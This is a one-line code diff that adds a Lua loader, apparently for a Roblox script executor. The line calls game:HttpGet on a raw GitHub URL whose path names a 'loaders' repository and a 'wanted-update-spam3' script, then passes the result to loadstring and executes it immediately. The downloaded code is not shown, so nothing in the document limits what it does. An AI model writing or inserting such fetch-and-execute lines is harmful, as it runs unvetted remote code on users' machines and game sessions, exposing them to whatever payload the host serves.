@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/wanted-update-spam3-vwtj1n9dgp9wp9.lua"))()
